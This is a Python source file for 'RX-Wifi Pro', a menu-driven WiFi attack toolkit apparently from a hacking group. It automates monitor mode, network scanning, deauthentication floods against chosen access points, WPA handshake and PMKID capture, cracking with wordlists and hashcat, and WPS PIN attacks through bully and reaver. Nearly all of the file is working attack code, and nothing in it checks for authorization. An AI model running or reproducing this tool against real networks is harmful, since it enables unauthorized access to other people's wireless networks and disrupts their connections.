#!/usr/bin/env python3
# ====================================================================================================================
#                                                   RX-Wifi Pro
#                                                     v3.0
#                                           Developed by CRZ101 - RX-TEAM
#                                       Parent Organization: ANONYMOUS YEMEN
#                                            All rights reserved. RX-TEAM
# ====================================================================================================================
# Advanced WiFi Security Testing Tool - Multi-Distribution Linux Support
# ====================================================================================================================
import os
import time
import subprocess
import shlex
import csv
import datetime
import sys
import random
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor

# ====================================================================================================================
# GLOBAL VARIABLES AND CONFIGURATION
# ====================================================================================================================
class Config:
    DEVELOPER = "CRZ101 - RX-TEAM"
    ORGANIZATION = "ANONYMOUS YEMEN"
    VERSION = "v3.0"
    SUPPORTED_DISTROS = ["kali", "ubuntu", "debian", "arch", "fedora", "centos", "parrot"]

# ====================================================================================================================
# CORE SYSTEM FUNCTIONS
# ====================================================================================================================
def check_root():
    """Check if script is run as root"""
    if os.geteuid() != 0:
        print("\033[91m[ERROR] Run as root: sudo python3 rxwifi.py\033[0m")
        sys.exit(1)

def check_dependencies():
    """Check and install required dependencies"""
    required_tools = ["aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
    missing = []
    
    for tool in required_tools:
        if subprocess.call(f"which {tool}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing.append(tool)
    
    if missing:
        print("\033[93m[+] Installing missing dependencies...\033[0m")
        for tool in missing:
            os.system(f"apt-get install -y {tool} 2>/dev/null || yum install -y {tool} 2>/dev/null || pacman -S --noconfirm {tool} 2>/dev/null")
    
    return len(missing) == 0

def cleanup_system():
    """Cleanup system state"""
    os.system("sudo airmon-ng check kill >/dev/null 2>&1")
    os.system("sudo pkill airodump-ng >/dev/null 2>&1")
    os.system("sudo pkill aireplay-ng >/dev/null 2>&1")

# ====================================================================================================================
# SMART PASSWORD ANALYZER
# ====================================================================================================================
class PasswordAnalyzer:
    def generate_smart_wordlist(self, essid, bssid):
        """Generate intelligent wordlist based on target info"""
        words = set()
        essid_clean = essid.lower().replace(' ', '').replace('-', '').replace('_', '')
        
        # Basic patterns
        basic_patterns = [
            essid_clean,
            essid_clean + '123',
            essid_clean + '1234',
            essid_clean + '123456',
            essid_clean + '!',
            essid_clean + '@',
            essid_clean + '#',
            'password',
            'admin',
            '12345678',
            '1234567890',
            'wifi',
            'wireless',
            'default',
            'root',
        ]
        
        # Add basic patterns
        words.update(basic_patterns)
        
        # Add BSSID-based patterns
        bssid_digits = ''.join(filter(str.isdigit, bssid))
        if bssid_digits:
            last_4 = bssid_digits[-4:]
            words.add(last_4)
            words.update([w + last_4 for w in list(words)[:10]])
        
        # Add common variations
        variations = []
        for word in list(words):
            variations.extend([
                word.upper(),
                word.capitalize(),
                word + '!',
                word + '!!',
                word + '2024',
                word + '2023',
            ])
        
        words.update(variations)
        
        # Save wordlist
        wordlist_file = f"wordlist_{essid_clean[:10]}.txt"
        with open(wordlist_file, 'w') as f:
            for word in words:
                if word:  # Skip empty strings
                    f.write(word + '\n')
        
        return wordlist_file

# ====================================================================================================================
# CORE WIFI ATTACK FUNCTIONS
# ====================================================================================================================
def start_monitor_mode():
    """Start monitor mode on wireless interface"""
    cleanup_system()
    
    print("\n\033[94m[+] Available interfaces:\033[0m")
    os.system("iwconfig 2>/dev/null | grep -E '^[a-z]' | grep -v 'no wireless'")
    
    interface = input("\n[+] Enter wireless interface (e.g. wlan0): ").strip()
    if not interface:
        interface = "wlan0"
    
    print(f"\033[94m[+] Starting monitor mode on {interface}...\033[0m")
    os.system(f"sudo airmon-ng check kill >/dev/null 2>&1")
    os.system(f"sudo airmon-ng start {interface} >/dev/null 2>&1")
    
    # Save interface info
    if not os.path.exists('configs'):
        os.makedirs('configs')
    
    with open("configs/interface.txt", "w") as f:
        f.write(f"{interface}mon")
    
    print("\033[92m[✓] Monitor mode activated!\033[0m")
    time.sleep(2)

def scan_networks():
    """Scan for available WiFi networks"""
    if not os.path.exists('configs/interface.txt'):
        print("\033[91m[!] Start monitor mode first!\033[0m")
        return
    
    with open("configs/interface.txt", "r") as f:
        interface = f.read().strip()
    
    print("\033[94m[+] Scanning networks for 10 seconds...\033[0m")
    
    # Remove old scan files
    os.system("rm -f configs/scan-*.csv")
    
    # Start scan
    cmd = f"sudo airodump-ng -w configs/scan --output-format csv {interface}"
    process = subprocess.Popen(cmd, shell=True)
    
    # Countdown
    for i in range(10, 0, -1):
        print(f"\r\033[93m[+] Scanning... {i}s \033[0m", end='')
        time.sleep(1)
    
    process.terminate()
    os.system("sudo pkill airodump-ng >/dev/null 2>&1")
    print("\n\033[92m[✓] Scan completed!\033[0m")
    
    display_networks()

def display_networks():
    """Display discovered networks"""
    csv_file = "configs/scan-01.csv"
    if not os.path.exists(csv_file):
        print("\033[91m[!] No scan data found. Please scan first.\033[0m")
        return
    
    print("\n\033[94m[+] Discovered Networks:\033[0m")
    print("=" * 80)
    print(f"{'No':<3} {'BSSID':<18} {'ESSID':<20} {'Channel':<8} {'Power':<6}")
    print("=" * 80)
    
    networks = []
    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
        reader = csv.reader(f)
        for row in reader:
            if len(row) >= 14 and row[0].strip() and not row[0].startswith('Station'):
                bssid = row[0].strip()
                power = row[8].strip() if len(row) > 8 else 'N/A'
                channel = row[3].strip() if len(row) > 3 else 'N/A'
                essid = row[13].strip() if len(row) > 13 else 'Hidden'
                
                if len(essid) > 20:
                    essid = essid[:17] + "..."
                
                networks.append((bssid, essid, channel, power))
    
    for i, (bssid, essid, channel, power) in enumerate(networks[:20], 1):
        print(f"{i:<3} {bssid:<18} {essid:<20} {channel:<8} {power:<6}")
    
    print("=" * 80)
    return networks

def capture_handshake():
    """Capture WPA handshake"""
    networks = display_networks()
    if not networks:
        return
    
    try:
        choice = int(input("\n[+] Select target network number: "))
        if 1 <= choice <= len(networks):
            bssid, essid, channel, power = networks[choice-1]
            
            with open("configs/interface.txt", "r") as f:
                interface = f.read().strip()
            
            output_file = input("[+] Enter output filename: ").strip() or "handshake"
            
            print(f"\033[94m[+] Targeting: {essid} ({bssid}) on channel {channel}\033[0m")
            print("\033[94m[+] Starting handshake capture...\033[0m")
            
            # Start handshake capture
            capture_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}"
            capture_process = subprocess.Popen(capture_cmd, shell=True)
            
            time.sleep(5)
            
            # Send deauth packets
            print("\033[94m[+] Sending deauthentication packets...\033[0m")
            deauth_cmd = f"sudo aireplay-ng --deauth 10 -a {bssid} {interface}"
            os.system(deauth_cmd + " >/dev/null 2>&1")
            
            # Wait for handshake
            print("\033[94m[+] Waiting for handshake (30 seconds)...\033[0m")
            time.sleep(30)
            
            capture_process.terminate()
            os.system("sudo pkill airodump-ng >/dev/null 2>&1")
            
            # Check for handshake
            cap_file = f"{output_file}-01.cap"
            if os.path.exists(cap_file):
                result = subprocess.call(f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'", shell=True)
                if result == 0:
                    print("\033[92m[✓] Handshake captured successfully!\033[0m")
                    
                    # Move to captures directory
                    if not os.path.exists('captures'):
                        os.makedirs('captures')
                    os.system(f"mv {output_file}* captures/ 2>/dev/null")
                    
                    crack_choice = input("\n[+] Crack password now? (y/n): ").lower()
                    if crack_choice == 'y':
                        crack_handshake(f"captures/{cap_file}")
                else:
                    print("\033[91m[!] No handshake captured\033[0m")
            else:
                print("\033[91m[!] Capture file not created\033[0m")
                
    except (ValueError, IndexError):
        print("\033[91m[!] Invalid selection\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error: {e}\033[0m")

def crack_handshake(cap_file):
    """Crack handshake with wordlist"""
    if not os.path.exists(cap_file):
        print("\033[91m[!] Handshake file not found\033[0m")
        return
    
    print("\n\033[94m[+] Cracking Options:\033[0m")
    print("1. Use rockyou.txt")
    print("2. Use custom wordlist")
    print("3. Generate smart wordlist")
    
    try:
        choice = input("\n[+] Select option: ")
        
        if choice == "1":
            wordlist = "/usr/share/wordlists/rockyou.txt"
            if not os.path.exists(wordlist):
                print("\033[91m[!] rockyou.txt not found\033[0m")
                return
        elif choice == "2":
            wordlist = input("[+] Enter wordlist path: ").strip()
            if not os.path.exists(wordlist):
                print("\033[91m[!] Wordlist not found\033[0m")
                return
        elif choice == "3":
            essid = input("[+] Enter target ESSID: ")
            bssid = input("[+] Enter target BSSID: ")
            analyzer = PasswordAnalyzer()
            wordlist = analyzer.generate_smart_wordlist(essid, bssid)
            print(f"\033[92m[✓] Generated wordlist: {wordlist}\033[0m")
        else:
            print("\033[91m[!] Invalid choice\033[0m")
            return
        
        print(f"\033[94m[+] Cracking with {wordlist}...\033[0m")
        os.system(f"aircrack-ng -w {wordlist} {cap_file}")
        
    except Exception as e:
        print(f"\033[91m[!] Error: {e}\033[0m")

def wps_attack():
    """Perform WPS attack"""
    networks = display_networks()
    if not networks:
        return
    
    try:
        choice = int(input("\n[+] Select target network number: "))
        if 1 <= choice <= len(networks):
            bssid, essid, channel, power = networks[choice-1]
            
            print(f"\033[94m[+] Starting WPS attack on {essid}...\033[0m")
            
            # Try bully first, then reaver
            print("\033[94m[+] Trying bully...\033[0m")
            bully_cmd = f"sudo bully -b {bssid} -c {channel} -v 3 wlan0mon"
            result = os.system(bully_cmd)
            
            if result != 0:
                print("\033[94m[+] Trying reaver...\033[0m")
                reaver_cmd = f"sudo reaver -i wlan0mon -b {bssid} -c {channel} -vv"
                os.system(reaver_cmd)
                
    except (ValueError, IndexError):
        print("\033[91m[!] Invalid selection\033[0m")

def pmkid_attack():
    """Perform PMKID attack"""
    networks = display_networks()
    if not networks:
        return
    
    try:
        choice = int(input("\n[+] Select target network number: "))
        if 1 <= choice <= len(networks):
            bssid, essid, channel, power = networks[choice-1]
            
            print(f"\033[94m[+] Starting PMKID attack on {essid}...\033[0m")
            
            # Check if hcxdumptool is available
            if subprocess.call("which hcxdumptool", shell=True, stdout=subprocess.DEVNULL) == 0:
                pmkid_file = f"pmkid_{int(time.time())}"
                print("\033[94m[+] Capturing PMKID (30 seconds)...\033[0m")
                
                # Capture PMKID
                capture_cmd = f"sudo hcxdumptool -i wlan0mon -o {pmkid_file}.pcapng --enable_status=1 --filterlist_ap={bssid} --filtermode=2"
                capture_process = subprocess.Popen(capture_cmd, shell=True)
                time.sleep(30)
                capture_process.terminate()
                
                # Convert to hash
                if os.path.exists(f"{pmkid_file}.pcapng"):
                    os.system(f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng 2>/dev/null")
                    
                    if os.path.exists(f"{pmkid_file}.hash"):
                        print("\033[92m[✓] PMKID hash captured!\033[0m")
                        crack_pmkid(f"{pmkid_file}.hash")
                    else:
                        print("\033[91m[!] PMKID capture failed\033[0m")
                else:
                    print("\033[91m[!] Capture file not created\033[0m")
            else:
                print("\033[91m[!] hcxdumptool not installed\033[0m")
                
    except (ValueError, IndexError):
        print("\033[91m[!] Invalid selection\033[0m")

def crack_pmkid(hash_file):
    """Crack PMKID hash"""
    if not os.path.exists(hash_file):
        print("\033[91m[!] Hash file not found\033[0m")
        return
    
    wordlist = "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        print("\033[91m[!] rockyou.txt not found\033[0m")
        return
    
    print("\033[94m[+] Cracking PMKID hash with hashcat...\033[0m")
    os.system(f"hashcat -m 16800 {hash_file} {wordlist}")

def parallel_attack():
    """Parallel handshake capture on multiple networks"""
    networks = display_networks()
    if not networks:
        return
    
    print("\033[94m[+] Select targets for parallel attack (comma-separated numbers):\033[0m")
    try:
        choices = input("[+] Target numbers: ").split(',')
        targets = []
        
        for choice in choices:
            idx = int(choice.strip()) - 1
            if 0 <= idx < len(networks):
                targets.append(networks[idx])
        
        if not targets:
            print("\033[91m[!] No valid targets selected\033[0m")
            return
        
        print(f"\033[94m[+] Starting parallel attack on {len(targets)} targets...\033[0m")
        
        def attack_target(target):
            bssid, essid, channel, power = target
            try:
                print(f"\033[93m[+] Attacking {essid}...\033[0m")
                os.system(f"sudo aireplay-ng --deauth 5 -a {bssid} wlan0mon >/dev/null 2>&1")
                return f"✓ Completed: {essid}"
            except Exception as e:
                return f"✗ Failed: {essid} - {e}"
        
        with ThreadPoolExecutor(max_workers=2) as executor:
            results = list(executor.map(attack_target, targets))
        
        for result in results:
            print(result)
            
    except Exception as e:
        print(f"\033[91m[!] Error: {e}\033[0m")

# ====================================================================================================================
# MAIN MENU
# ====================================================================================================================
def main_menu():
    """Display main menu"""
    os.system("clear")
    print(r"""
__      ______________                       __   ______________ 
/  \    /  \__\_   ___ \____________    ____ |  | _\_   _____/|__|
\   \/\/   /  /    \  \/\_  __ \__  \ _/ ___\|  |/ /|    __)  |  |
 \        /|  \     \____|  | \// __ \\  \___|    < |     \   |  |
  \__/\  / |__|\______  /|__|  (____  /\___  >__|_ \\___  /   |__|
       \/             \/            \/     \/     \/    \/        
    """)
    
    print(f"""
    \033[94mDeveloped by: {Config.DEVELOPER}\033[0m
    \033[93mOrganization: {Config.ORGANIZATION}\033[0m
    \033[92mVersion: {Config.VERSION}\033[0m

\033[96m══════════════════════════════════════════════════════════════════════════════\033[0m
\033[1m                      RX-Wifi ADVANCED OPTIONS:\033[0m
\033[96m══════════════════════════════════════════════════════════════════════════════\033[0m
  [1] 📡 Start Monitor Mode
  [2] 🌐 Scan Networks  
  [3] 🤝 Capture Handshake
  [4] 🔓 Crack Handshake
  [5] 📶 WPS Attack
  [6] 🔑 PMKID Attack
  [7] ⚡ Parallel Attacks
  [8] 🧠 Smart Wordlist Generator
  [9] 🗑️ Cleanup System
  [10] ❌ Exit

\033[96m══════════════════════════════════════════════════════════════════════════════\033[0m
""")

def main():
    """Main program loop"""
    check_root()
    
    if not check_dependencies():
        print("\033[93m[!] Some dependencies may be missing. Continuing anyway...\033[0m")
        time.sleep(2)
    
    while True:
        main_menu()
        choice = input("\n[+] Select option: ")
        
        options = {
            "1": start_monitor_mode,
            "2": scan_networks,
            "3": capture_handshake,
            "4": lambda: crack_handshake(input("[+] Enter handshake file path: ")),
            "5": wps_attack,
            "6": pmkid_attack,
            "7": parallel_attack,
            "8": lambda: PasswordAnalyzer().generate_smart_wordlist(
                input("[+] Enter ESSID: "), input("[+] Enter BSSID: ")),
            "9": cleanup_system,
            "10": lambda: (print("\033[92m[+] Goodbye!\033[0m"), sys.exit(0))
        }
        
        if choice in options:
            try:
                options[choice]()
            except Exception as e:
                print(f"\033[91m[!] Error: {e}\033[0m")
            input("\n[+] Press Enter to continue...")
        else:
            print("\033[91m[!] Invalid option\033[0m")
            time.sleep(1)

# ====================================================================================================================
# START PROGRAM
# ====================================================================================================================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[92m[+] Program terminated by user\033[0m")
        cleanup_system()
        sys.exit(0)
    except Exception as e:
        print(f"\033[91m[!] Critical error: {e}\033[0m")
        cleanup_system()
        sys.exit(1)